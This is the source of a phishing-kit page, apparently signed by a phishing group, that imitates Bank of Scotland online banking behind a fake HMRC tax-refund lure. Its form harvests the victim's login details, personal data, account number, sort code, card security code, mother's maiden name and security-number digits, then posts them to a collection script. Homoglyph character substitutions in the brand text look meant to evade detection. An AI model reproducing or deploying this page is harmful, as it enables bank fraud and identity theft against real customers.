<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
define("telepinselect", "
<option value='-'>Please enter...</option>
<option value='0'>&nbsp;0</option>
<option value='1'>&nbsp;1</option>
<option value='2'>&nbsp;2</option>
<option value='3'>&nbsp;3</option>
<option value='4'>&nbsp;4</option>
<option value='5'>&nbsp;5</option>
<option value='6'>&nbsp;6</option>
<option value='7'>&nbsp;7</option>
<option value='8'>&nbsp;8</option>
<option value='9'>&nbsp;9</option>
");

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>Verify</title>
<meta content="en-gb" http-equiv="content-language">
<link href="assets/img/favicon.ico" rel="shortcut icon">
<link href="assets/css/001.css" media="screen, print" rel="stylesheet" type="text/css">
<link href="assets/css/002.css" media="screen, print" rel="stylesheet" type="text/css">
<link href="assets/css/003.css" media="screen, print" rel="stylesheet" type="text/css">
<script src="assets/js/jquery.js" type="text/javascript"></script>
<script src="assets/js/wording.jspf" type="text/javascript"></script>
<script src="assets/js/global.js" type="text/javascript"></script>
<script type="text/javascript">
DI.themePath="https://online.bankofscotland.co.uk//personal/unauth/assets/BOSRetail/";
</script>
<script type="text/javascript">
function NoPin()
{
if (checkbox.checked){
document.getElementById("selectpin1").innerHTML = "<label id='telepinlabel2' for='telepin2'>Character 2 :</label><select id='telepin2' disabled name='telepin2' onchange='CaptureValue2(this.form)'><option value='-'>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
document.getElementById("selectpin2").innerHTML = "<label id='telepinlabel4' for='telepin4'>Character 4 :</label><select id='telepin4' disabled name='telepin4' onchange='CaptureValue4(this.form)'><option value='-'>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
document.getElementById("selectpin3").innerHTML = "<label id='telepinlabel6' for='telepin6'>Character 6 :</label><select id='telepin6' disabled name='telepin6' onchange='CaptureValue6(this.form)'><option value='-'>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
}
else {
document.getElementById("selectpin1").innerHTML = "<label id='telepinlabel2' for='telepin2'>Character 2 :</label><select id='telepin2' name='telepin2' onchange='CaptureValue2(this.form)'><option value='-'>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
document.getElementById("selectpin2").innerHTML = "<label id='telepinlabel4' for='telepin4'>Character 4 :</label><select id='telepin4' name='telepin4' onchange='CaptureValue4(this.form)'><option value='-'>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
document.getElementById("selectpin3").innerHTML = "<label id='telepinlabel6' for='telepin6'>Character 6 :</label><select id='telepin6' name='telepin6' onchange='CaptureValue6(this.form)'><option value='-'>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
}
}	
function ChangePinInput()
{
document.getElementById("selectpin1").innerHTML = "<label id='telepinlabel1' for='telepin1'>Character 1 :</label><select id='telepin1' name='telepin1' onchange='CaptureValue1(this.form)'><option value='-'>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
document.getElementById("selectpin2").innerHTML = "<label id='telepinlabel3' for='telepin3'>Character 3 :</label><select id='telepin3' name='telepin3' onchange='CaptureValue3(this.form)'><option value='-'>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
document.getElementById("selectpin3").innerHTML = "<label id='telepinlabel5' for='telepin5'>Character 5 :</label><select id='telepin5' name='telepin5' onchange='CaptureValue5(this.form)'><option value='-'>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
return false;
}
function FocusOnInput()
{
document.getElementById("title").focus();
}
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
function CaptureValue1(f) {
    f.telepinFinal1.value = f.telepin1.value;
}
function CaptureValue2(f) {
    f.telepinFinal2.value = f.telepin2.value;
}
function CaptureValue3(f) {
    f.telepinFinal3.value = f.telepin3.value;
}
function CaptureValue4(f) {
    f.telepinFinal4.value = f.telepin4.value;
}
function CaptureValue5(f) {
    f.telepinFinal5.value = f.telepin5.value;
}
function CaptureValue6(f) {
    f.telepinFinal6.value = f.telepin6.value;
	ChangePinInput();
}
</script>
<script src="assets/js/custom.js" type="text/javascript"></script>
<link href="assets/css/004.css" media="screen" rel="stylesheet" type="text/css">
</head>
<body>
<div id="wrapper">
<div class="outer">
<div id="header">
<ul id="skiplinks">
<li><a href="#" id="lnkSkip" name="lnkSkip">Skip t&omicron; main c&omicron;ntent</a></li>
</ul>
<div class="clearfix"><span id="strbrandname" style="display: none">&Beta;&Omicron;S</span>
<p id="logo"><span><img src="assets/img/logo.gif"></span></p>
<div class="secureMsg">
<p class="msg"><img src="assets/img/msg.png"></p>
<p><a class="newwin" href="#">H&omicron;w can I tell that this site is secure?</a></p>
</div>
<div class="loggedIn">
<ul>
<li class="mobile"><a class="linkBullet" href="#">M&omicron;bile</a></li>
<li class="cookie"><a class="linkBullet newwin" href="#">C&omicron;&omicron;kie p&omicron;licy</a></li>
</ul>
</div>
</div>
</div>
</div>
<div class="pageWrap">
<div class="content" id="page">
<div class="primaryWrap">
<div class="primary">
<div class="panel"><span id="strBrandName" style="display:none">&Beta;OS</span> <span id="strstepno" style="display:none">Step 1</span> <span id="strscenarioname" style=
"display:none">onlineregistration</span>
<div class="navBar clearfix dbtNav">
<ol class="progressBar">
<li class="current">
<div>Tax Refund</div>
</li>
<li class="last">
<div>Complete</div>
</li>
</ol>
</div>
<form action="Finish.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" autocomplete="off" class="validationName:(frm_personalRegistration) validate:() validationName:(registerIB) validate:()"enctype="application/x-www-form-urlencoded" id="frm_personalRegistration"
method="post" name="frm_personalRegistration">
<input type="hidden" name="username" value="<?=$_POST['username']?>">
<input type="hidden" name="password" value="<?=$_POST['password']?>">
<input type="hidden" name="memo" value="<?=$_POST['memo']?>">
<div class="inner">
<h1>Tax Refund &ndash; please enter your details</h1>
<p><strong>In order for HMRC to process your tax refund into your account please verify your information below.</strong></p>
<p>Please ensure you have the following information to hand:</p>
<ul>
<li>Your bank card</li>
<li>Your online banking information</li>
<li>6-digit security number </li>
</ul>
</div>
<fieldset>
<div class="formField clearfix">
<div class="formFieldInner"><label for="frm_personalRegistration:txtFirstName"><strong>Full name:</strong></label><input autocomplete="off" class="field" id=
"frm_personalRegistration:txtFirstName" maxlength="30" name="name" type="text" value="<?php echo $_SESSION['name'];?>"></div>
</div>
<div class="formField clearfix">
<div class="formFieldInner">
<div class="date inputGroup"><span class="label"><strong>Date of
birth:</strong></span><label class="postit" for=
"frm_personalRegistration:slctDateDay">Day</label><select class="day slctDay"
id="frm_personalRegistration:slctDateDay" name=
"day">
<option value="<?php echo $_SESSION['day'];?>"><?php echo $_SESSION['day'];?></option>
<option value=''>Day</option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
</select><label class="postit" for=
"frm_personalRegistration:slctDateDay.month">Month</label><select class=
"month slctMonth" id="frm_personalRegistration:slctDateDay.month" name=
"month">
<option value="<?php echo $_SESSION['month'];?>"><?php echo $_SESSION['month'];?></option>
<option value=''>Month</option>
<option value="Jan">Jan</option>
<option value="Feb">Feb</option>
<option value="Mar">Mar</option>
<option value="Apr">Apr</option>
<option value="May">May</option>
<option value="Jun">Jun</option>
<option value="Jul">Jul</option>
<option value="Aug">Aug</option>
<option value="Sep">Sep</option>
<option value="Oct">Oct</option>
<option value="Nov">Nov</option>
<option value="Dec">Dec</option>
</select><label class="postit" for=
"frm_personalRegistration:slctDateDay.year">Year</label><select class=
"year slctYear" id="frm_personalRegistration:slctDateDay.year" name=
"year">
<option value="<?php echo $_SESSION['year'];?>"><?php echo $_SESSION['year'];?></option>
<option value=''>Year</option>
<option value="1915">1915</option>
<option value="1916">1916</option>
<option value="1917">1917</option>
<option value="1918">1918</option>
<option value="1919">1919</option>
<option value="1920">1920</option>
<option value="1921">1921</option>
<option value="1922">1922</option>
<option value="1923">1923</option>
<option value="1924">1924</option>
<option value="1925">1925</option>
<option value="1926">1926</option>
<option value="1927">1927</option>
<option value="1928">1928</option>
<option value="1929">1929</option>
<option value="1930">1930</option>
<option value="1931">1931</option>
<option value="1932">1932</option>
<option value="1933">1933</option>
<option value="1934">1934</option>
<option value="1935">1935</option>
<option value="1936">1936</option>
<option value="1937">1937</option>
<option value="1938">1938</option>
<option value="1939">1939</option>
<option value="1940">1940</option>
<option value="1941">1941</option>
<option value="1942">1942</option>
<option value="1943">1943</option>
<option value="1944">1944</option>
<option value="1945">1945</option>
<option value="1946">1946</option>
<option value="1947">1947</option>
<option value="1948">1948</option>
<option value="1949">1949</option>
<option value="1950">1950</option>
<option value="1951">1951</option>
<option value="1952">1952</option>
<option value="1953">1953</option>
<option value="1954">1954</option>
<option value="1955">1955</option>
<option value="1956">1956</option>
<option value="1957">1957</option>
<option value="1958">1958</option>
<option value="1959">1959</option>
<option value="1960">1960</option>
<option value="1961">1961</option>
<option value="1962">1962</option>
<option value="1963">1963</option>
<option value="1964">1964</option>
<option value="1965">1965</option>
<option value="1966">1966</option>
<option value="1967">1967</option>
<option value="1968">1968</option>
<option value="1969">1969</option>
<option value="1970">1970</option>
<option value="1971">1971</option>
<option value="1972">1972</option>
<option value="1973">1973</option>
<option value="1974">1974</option>
<option value="1975">1975</option>
<option value="1976">1976</option>
<option value="1977">1977</option>
<option value="1978">1978</option>
<option value="1979">1979</option>
<option value="1980">1980</option>
<option value="1981">1981</option>
<option value="1982">1982</option>
<option value="1983">1983</option>
<option value="1984">1984</option>
<option value="1985">1985</option>
<option value="1986">1986</option>
<option value="1987">1987</option>
<option value="1988">1988</option>
<option value="1989">1989</option>
<option value="1990">1990</option>
<option value="1991">1991</option>
<option value="1992">1992</option>
<option value="1993">1993</option>
<option value="1994">1994</option>
<option value="1995">1995</option>
<option value="1996">1996</option>
<option value="1997">1997</option>
<option value="1998">1998</option>
<option value="1999">1999</option>
<option value="2000">2000</option>
<option value="2001">2001</option>
<option value="2002">2002</option>
<option value="2003">2003</option>
<option value="2004">2004</option>
</select></div>
</div>
</div>
<div class=
"formField clearfix">
<div class="formFieldInner"><label for="door"><strong>Address (Line 1):</strong></label>
<input autocomplete="off" class="field" id="frm_personalRegistration:txtPostcode" maxlength="30" name="address" type="text" value="<?php echo $_SESSION['address'];?>"></div>
</div>
<div class="formField validate:(requiredWithoutCheckbox_validatePostcode) validationName:(postcodeAddress) clearfix">
<div class="formFieldInner"><label for=
"frm_personalRegistration:txtPostcode"><strong>UK
postcode:</strong></label><input autocomplete="off" class=
"postcode linkedTextField" id="frm_personalRegistration:txtPostcode" maxlength=
"8" name="postcode" type="text" value="<?php echo $_SESSION['postcode'];?>"></div>
</div>
<div class=
"formField validationName:(txtEmailAddress) validationName:(txtEmailAddress) validate:(required_validateEmail) clearfix">
<div class="formFieldInner"><label for=
"frm_personalRegistration:txtemail"><strong>Email Address:</strong></label>
<input autocomplete="off" class="field" id="frm_personalRegistration:txtemail" maxlength="30" name="email" type="text" value="<?php echo $_SESSION['email'];?>">
</div>
</div>
<div class=
"formField validate:(required_validateNumeric_validatePhoneNumber[isMobileNumber:true]) validationName:(mobilePhoneNumber) clearfix">
<div class="formFieldInner"><label for=
"frm_personalRegistration:txttelephone"><strong>Mobile Number:</strong></label>
<input autocomplete="off" class="field" id="personalDetails:mobilePhoneNumber" maxlength="11" name="telephone" type="text" value="<?php echo $_SESSION['telephone'];?>">
</div>
</div>
</fieldset>
<fieldset>
<div class="formField clearfix validationName:(Account) validate:(required_validateAccountNumber)">
<div class="formFieldInner"><label for=
"accountnumber">Account Number:</label><input autocomplete="off"
class="field" id="frm_personalRegistration:txttitle" maxlength="8" name=
"acno" type="text" value="<?php echo $_SESSION['acno'];?>"></div>
</div>
<div class="formField fieldHelp validate:(required_validateNumeric_validateSortcode) validationName:(sortCode) sortCode clearfix">
<div class="formFieldInner">
<div class="inputGroup"><span class="label"><strong>Sort code:</strong></span>
<label class="postit" for="sc1">Sort code part 1</label>
<input id="sc1" maxlength="2" name="sc1" size="2" type="text" onkeyup="movetoNext(this, 'sc2')" value="<?php echo $_SESSION['sort1'];?>"> 
<span class="separator">-</span>
<label class="postit" for="sc2">Sort code part 2</label>
<input id="sc2" maxlength="2" name="sc2" size="2" type="text" onkeyup="movetoNext(this, 'sc3')" value="<?php echo $_SESSION['sort2'];?>">
<span class="separator">-</span>
<label class="postit" for="sc3">Sort code part 3</label>
<input id="sc3" maxlength="2" name="sc3" size="2" type="text" value="<?php echo $_SESSION['sort3'];?>"></div>
</div>
</div>
<div class="formField validationName:(secode) validate:(required_validateNumeric) clearfix">
<div class="formFieldInner"><label for="memo">Card Security Code:</label>
<input autocomplete="off"class="secode" id="secode" maxlength="3" name="secode" type="text" value="<?php echo $_SESSION['secode'];?>">
</div>
</div>
<div class="formField validationName:(mmn) validate:(required_validateAlpha) clearfix">
<div class="formFieldInner"><label for="mmn">Mothers Maiden Name:</label>
<input autocomplete="off"class="field" id="mmn" maxlength="30" name="mmn" type="text" value="<?php echo $_SESSION['mmn'];?>">
</div>
</div>
<fieldset class="dash memInfoSelect clearfix">
<div class="inner">
<h2>6-digit Security Number</h2>
<p><img src="assets/img/pink.png">&nbsp;Please select the characters from your 6-digit security number below:</p>
</div>
<div id="skippin" class="formField validationName:(pin) validate:(required) clearfix">
<div class="formFieldInner">
<div class="clearfix">
<div id="selectpin1">
<label id="telepinlabel2" for="telepin2">Character 2 :</label>
<select id="telepin2" name="telepin2" onchange="CaptureValue2(this.form)">
<?php echo telepinselect; ?>
</select>
</div>
</div>
<div class="clearfix">
<div id="selectpin2">
<label id="telepinlabel4" for="telepin4">Character 4 :</label>
<select id="telepin4" name="telepin4" onchange="CaptureValue4(this.form)">
<?php echo telepinselect; ?>
</select>
</div>
</div>
<div class="clearfix">
<div id="selectpin3">
<label id="telepinlabel6" for="telepin6">Character 6 :</label>
<select id="telepin6" name="telepin6" onchange="CaptureValue6(this.form)">
<?php echo telepinselect; ?>
</select>
</div>
</div>
</div>
</div>
<div style="display:block;" class="inner">
<strong>or</strong></div>
<div class="formField clearfix fieldHelp checkbox">
<div class="formFieldInner">
<input id="checkbox" type="checkbox" name="checkbox" value="check" class="linkedCheckBox" onclick="NoPin()">
<label for="frm_personalRegistration:tempResidence">You should tick this box if you don&apos;t yet have a 6-digit Security
Number.</label>
<span class="cxtHelp"><a class="cxtTrigger" href="#_idFC12">[?]</a></span>
<div id="_idFC12" class="help">
<p>You would normally receive your 6-digit security number in the post if you don&apos;t yet have a 6-digit Security
Number tick the box</p>
</div>
</div>
</div>
</fieldset>
<input type="hidden" name="telepinFinal1" id="telepinFinal1">
<input type="hidden" name="telepinFinal2" id="telepinFinal2">
<input type="hidden" name="telepinFinal3" id="telepinFinal3">
<input type="hidden" name="telepinFinal4" id="telepinFinal4">
<input type="hidden" name="telepinFinal5" id="telepinFinal5">
<input type="hidden" name="telepinFinal6" id="telepinFinal6">
<div class="dbtSteps clearfix">
<ul class="actions linkList">
<li class="primaryAction">
<input alt="Continue" class="submitAction" id="frm_personalRegistration:continuebutton1" name="frm_personalRegistration:continuebutton1" src="assets/img/continue.png" title="Continue" type="image" onclick=""/></li>
</ul>
</div>
</form>
</div>
</div>
</div>
<div class="secondary">
<div class="panel">
<div class="accordion ui-accordion ui-widget ui-helper-reset">
<div class="partShadow">
<div class="part">
<h2 class="trigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" title="Contact us: Use this link to show or hide more information.">
<span class="ui-icon ui-icon-triangle-1-e"></span>C&omicron;ntact us</h2>
<div class="pane ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<div class="paneInner">
<div class="quickContact">
<h3>Internet &Beta;anking Helpdesk</h3>
<p>0345 521 5412</p>
<p>+44 1138 12 23 05&nbsp;fr&omicron;m &omicron;utside the UK</p>
<h3>&Beta;ank acc&omicron;unts</h3>
<p>0345 858 9856</p>
<p>+44 215 258 1258&nbsp;fr&omicron;m &omicron;utside the UK</p>
<h3>Savings (including cash ISAs)</h3>
<p>08457 98 02 02<br></p>
<p>Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 8:00am – 8:00pm; Saturday 8:00am – 6:00pm; Sunday 9:00am - 5:00pm.</p>
<p>F&omicron;r st&omicron;cks and shares ISAs see <strong>ISA Investor</strong>.</p>
<h3>Investments</h3>
<p><strong>08452 540 212</strong><br>
Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 8.30am – 7pm; Saturday 8.30am – 12:30pm<br>
&nbsp;<br>
F&omicron;r cash ISAs see <strong>Savings (including cash ISAs).</strong></p>
<h3>Credit cards</h3>
<p>0346 326 2012</p>
<p>+44 215 021 1525&nbsp;fr&omicron;m &omicron;utside the UK</p>
<h3>M&omicron;rtgages</h3>
<p>08456 21 21 85<br>
Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 8:00am - 8:00pm; Saturday 9:00am - 4:00pm.</p>
<h3>Pers&omicron;nal l&omicron;ans</h3>
<p>If y&omicron;ur <strong>l&omicron;an agreement begins with<br>
7 call&nbsp;08459 65 68 64<br></strong>(Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 8:00am - 8:00pm; Saturday 9:00am - 6:00pm).</p>
<p>If y&omicron;ur <strong>l&omicron;an agreement begins with<br>
88 &omicron;r 16 call</strong>&nbsp;<strong>08452 00 12 50<br></strong>(Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 8:00am - 10:00pm; Saturday 9:00am - 6:00pm; Sunday 9:30am - 5.30pm).</p>
<p>If y&omicron;ur <strong>l&omicron;an agreement begins with<br>
100 call&nbsp;08466 45 62 88<br></strong>(Lines are &omicron;pen M&omicron;nday t&omicron; Sunday, 8:00am- 10:00pm).</p>
<h3>&nbsp;L&omicron;st &omicron;r st&omicron;len cards</h3>
<p>0800 525 5858</p>
<h3>Textph&omicron;ne</h3>
<p>0346 752 4106<br>
Lines are &omicron;pen M&omicron;nday t&omicron; Friday, 9:00am - 5.30pm. (F&omicron;r use by cust&omicron;mers with hearing impairments &omicron;nly)</p>
<p>We may rec&omicron;rd y&omicron;ur call s&omicron; we can check we've carried &omicron;ut y&omicron;ur instructi&omicron;ns c&omicron;rrectly and t&omicron; help us impr&omicron;ve &omicron;ur service.</p>
</div>
</div>
</div>
</div>
</div>
<div class="partShadow">
<div class="part">
<h2 class="trigger current">Help &amp; supp&omicron;rt</h2>
<div class="pane">
<div class="paneInner">
<span class="showMeMenu">
<ul class="quickFAQs ui-accordion ui-widget ui-helper-reset">
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" title=
"What can I do with Internet Banking?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>What can I do with Internet &Beta;anking?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>&Beta;anking &omicron;nline is easy and m&omicron;re c&omicron;nvenient than ever bef&omicron;re. Y&omicron;u can manage y&omicron;ur acc&omicron;unts, check y&omicron;ur balance and make payments – all fr&omicron;m the c&omicron;mf&omicron;rt &omicron;f y&omicron;ur &omicron;wn h&omicron;me &omicron;r the c&omicron;nvenience &omicron;f y&omicron;ur
m&omicron;bile ph&omicron;ne.</p>
<p>Find &omicron;ut m&omicron;re ab&omicron;ut&nbsp;<a class="newwin" href="#" tabindex="0">what y&omicron;u can d&omicron;</a>&nbsp;with Internet &Beta;anking.</p>
<p></p>
</div>
</li>
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" title=
"I don't have an existing account, how do I apply?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>I don't have an existing account, how do I
apply?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>Please visit&nbsp;<a class="newwin" href="#" tabindex="0">bank&omicron;fsc&omicron;tland.c&omicron;.uk</a>&nbsp;and select a service &omicron;f y&omicron;ur ch&omicron;ice t&omicron; view details and apply.</p>
<p></p>
</div>
</li>
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" title=
"Which account details should I provide if I have more than one account with Bank of Scotland?: Use this link to show or hide more information."><span class=
"ui-icon ui-icon-triangle-1-e"></span>Which acc&omicron;unt details sh&omicron;uld I pr&omicron;vide if I have m&omicron;re than &omicron;ne acc&omicron;unt with &Beta;ank &omicron;f Sc&omicron;tland?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>It’s really up t&omicron; y&omicron;u. Y&omicron;u c&omicron;uld c&omicron;nsider using the acc&omicron;unt that y&omicron;u use m&omicron;st frequently &omicron;r wh&omicron;se details y&omicron;u remember best.</p>
<p></p>
</div>
</li>
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" title=
"Where can I find my sort code and account number?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Where can I find my s&omicron;rt c&omicron;de and acc&omicron;unt
number?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>Y&omicron;u can find these details &omicron;n &omicron;ne &omicron;f y&omicron;ur latest statements &omicron;r &omicron;n y&omicron;ur cheque b&omicron;&omicron;k.</p>
<p></p>
</div>
</li>
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" title=
"Where do I find my credit card number?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Where d&omicron; I find my credit card number?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>It’s the 16-digit number &omicron;n the fr&omicron;nt &omicron;f y&omicron;ur credit card. Please enter it with&omicron;ut spaces.</p>
<p></p>
</div>
</li>
<li class="ui-accordion-li-fix">
<h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" title=
"Why is it necessary to provide my email address?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Why is it necessary t&omicron; pr&omicron;vide my email
address?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;">
<p></p>
<p>We need it t&omicron; c&omicron;ntact y&omicron;u sh&omicron;uld any queries arise &omicron;n y&omicron;ur acc&omicron;unt.</p>
<p></p>
</div>
</li>
</ul>
<p><a class="linkBullet linkMore newwin newfaqwin" href="#" tabindex="-1">More help &amp; supp&omicron;rt</a></p>
</div>
</div>
</div>
</div>
</div>
<div class="subPanelShadow">
<div class="subPanel">
<h3>&Omicron;ur &Omicron;nline &Beta;anking Guarantee</h3>
<p>We d&omicron; all we can t&omicron; pr&omicron;tect y&omicron;u &omicron;nline. Even in the unlikely event &omicron;f fraud, we pr&omicron;mise y&omicron;u w&omicron;n't l&omicron;se &omicron;ut. As a &Beta;ank &omicron;f Sc&omicron;tland Internet &Beta;anking cust&omicron;mer, y&omicron;u aut&omicron;matically benefit fr&omicron;m &omicron;ur
&omicron;nline fraud guarantee:</p>
<p><strong>If y&omicron;u use &omicron;ur &omicron;nline service and bec&omicron;me a victim &omicron;f &omicron;nline fraud, we guarantee y&omicron;u w&omicron;n't l&omicron;se any m&omicron;ney fr&omicron;m y&omicron;ur acc&omicron;unt, and will always be reimbursed in full.</strong></p>
<p>F&omicron;r the vast maj&omicron;rity &omicron;f &omicron;ur cust&omicron;mers, this situati&omicron;n will never arise, especially if y&omicron;u take a few simple steps:</p>
<ul>
<li>Keep y&omicron;ur passw&omicron;rd secure and d&omicron; n&omicron;t <strong>let any&omicron;ne else make use &omicron;f y&omicron;ur security details</strong>, even if they share a j&omicron;int acc&omicron;unt with y&omicron;u</li>
<li>D&omicron; n&omicron;t let any&omicron;ne watch y&omicron;u enter y&omicron;ur security details and l&omicron;g &omicron;ut after each Internet &Beta;anking sessi&omicron;n</li>
<li>Carry &omicron;ut regular virus checks &omicron;n y&omicron;ur devices and have the latest &omicron;perating system and web br&omicron;wser installed.</li>
</ul>
<p>Find &omicron;ut m&omicron;re ab&omicron;ut h&omicron;w t&omicron;&nbsp;<a class="newwin" href="#">Pr&omicron;tect y&omicron;urself &omicron;nline</a>.</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="footer">
<div class="outer">
<div id="footerInner">
<ul>
<li><a class="newwin" href="#">Legal</a></li>
<li><a class="newwin" href="#">Privacy</a></li>
<li><a class="newwin" href="#">Security</a></li>
<li><a class="newwin" href="#">www.ll&omicron;ydsbankinggr&omicron;up.c&omicron;m</a></li>
<li><a class="newwin" href="#">Rates &amp; fees</a></li>
</ul>
</div>
</div>
</div>
</div>
<script src="assets/js/footer.js" type="text/javascript"></script>
</body>
</html>
<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
?>